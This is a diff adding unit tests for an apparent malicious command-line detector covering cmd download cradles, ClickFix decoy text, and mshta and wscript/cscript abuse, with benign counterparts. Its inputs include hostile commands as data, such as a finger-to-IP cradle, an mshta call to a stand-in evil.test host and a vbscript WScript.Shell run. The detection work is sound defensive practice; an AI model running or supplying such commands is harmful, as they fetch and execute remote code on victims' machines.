@@ -184,3 +184,75 @@ describe('WSH honesty signals', () => {
     expect(sigs).not.toContain('wsh-concat-eval-present')
   })
 })
+
+describe('cmd-cradle', () => {
+  it('fires on a for /f loop wrapping a download/exec inner command (finger)', () => {
+    const s = analyze("for /f %e in ('finger user@45.9.148.20') do %e", "cmd /c for /f %e in ('finger user@45.9.148.20') do %e")
+    const c = s.find((x) => x.id === 'cmd-cradle')
+    expect(c).toBeTruthy()
+    expect(c!.techniqueIds).toEqual(expect.arrayContaining(['T1059.003', 'T1105']))
+  })
+
+  it('fires on a for /f loop wrapping a nested powershell payload', () => {
+    expect(ids("for /f %e in ('powershell -enc AAAA') do %e")).toContain('cmd-cradle')
+  })
+
+  it('benign twin: for /f alone (no download/exec inner command) does NOT fire', () => {
+    expect(ids("for /f %i in ('dir /b') do echo %i")).not.toContain('cmd-cradle')
+  })
+
+  it('benign twin: for /f parsing robocopy/reg query output does NOT fire (FP pressure test)', () => {
+    expect(ids('for /f "tokens=3" %a in (\'reg query HKCU\\Software /v Ver\') do echo %a')).not.toContain('cmd-cradle')
+    expect(ids('for /f %f in (\'robocopy C:\\src C:\\dst /L\') do echo %f')).not.toContain('cmd-cradle')
+  })
+
+  it('co-occurrence upgrade: cmd-cradle + a broadened ClickFix decoy upgrades cmd-cradle to near-dispositive', () => {
+    const script = "for /f %e in ('finger user@45.9.148.20') do %e & echo --Verify... press ENTER to continue"
+    expect(specOf(script, 'cmd-cradle')).toBe('near-dispositive')
+  })
+})
+
+describe('broadened ClickFix decoy phrases', () => {
+  it('fires on "--Verify... press ENTER" style decoys from the live-test sample', () => {
+    expect(ids('echo --Verify... press ENTER to continue')).toContain('clickfix')
+  })
+})
+
+describe('mshta interpreter-aware rule', () => {
+  it('fires when interpreter is mshta with a URL target', () => {
+    const s = classify(buildContext('http://evil.test/x.hta', [], 'mshta'))
+    const m = s.find((x) => x.id === 'mshta-interpreter')
+    expect(m).toBeTruthy()
+    expect(m!.techniqueIds).toContain('T1218.005')
+  })
+
+  it('dual-tags T1059.005 when the discriminator is an inline vbscript: scheme', () => {
+    const s = classify(buildContext('vbscript:CreateObject("WScript.Shell").Run("calc.exe")', [], 'mshta'))
+    const m = s.find((x) => x.id === 'mshta-interpreter')
+    expect(m!.techniqueIds).toEqual(expect.arrayContaining(['T1218.005', 'T1059.005']))
+  })
+
+  it('benign twin: mshta with no URL/.hta/inline-script discriminator does NOT fire', () => {
+    const s = classify(buildContext('about:blank', [], 'mshta'))
+    expect(s.map((x) => x.id)).not.toContain('mshta-interpreter')
+  })
+})
+
+describe('wscript/cscript script-execution rule', () => {
+  it('fires on wscript launching a .vbs from a suspicious path with //E:', () => {
+    const s = classify(buildContext('C:\\Users\\Public\\payload.vbs', [{ flag: '//E:vbscript', raw: '//E:vbscript', techniqueIds: ['T1059.005'] }], 'wscript'))
+    const w = s.find((x) => x.id === 'wsh-script-exec')
+    expect(w).toBeTruthy()
+    expect(w!.techniqueIds).toContain('T1059.005')
+  })
+
+  it('fires on cscript launching a .js from a suspicious AppData path', () => {
+    const s = classify(buildContext('C:\\Users\\bob\\AppData\\Roaming\\dropper.js', [], 'cscript'))
+    expect(s.map((x) => x.id)).toContain('wsh-script-exec')
+  })
+
+  it('benign twin: wscript launching a .vbs from a trusted path with no //E: flag does NOT fire', () => {
+    const s = classify(buildContext('C:\\Program Files\\LegitApp\\installer.vbs', [], 'wscript'))
+    expect(s.map((x) => x.id)).not.toContain('wsh-script-exec')
+  })
+})
